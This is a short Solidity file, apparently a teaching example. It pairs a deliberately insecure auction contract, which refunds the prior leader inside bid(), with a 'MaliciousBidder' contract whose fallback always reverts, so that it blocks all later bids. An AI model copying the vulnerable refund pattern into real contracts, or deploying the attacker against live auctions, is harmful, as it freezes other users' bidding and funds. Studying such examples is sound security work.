pragma solidity 0.4.19;

contract InsecureAuction {

    address public currentLeader;
    uint public highestBid;

    function bid() payable public {
        require(msg.value > highestBid);

        // Refund the old leader, if it fails then revert
        require(currentLeader.send(highestBid));

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract MaliciousBidder {

    address public payer;
    uint256 public amount;

    // default function call always fail
    function () payable public {
        // this will always fail
        require(msg.value < 0);
    }

    function bid(address addr) payable public {
        InsecureAuction auction = InsecureAuction(addr);
        auction.bid.value(msg.value)();
    }
}
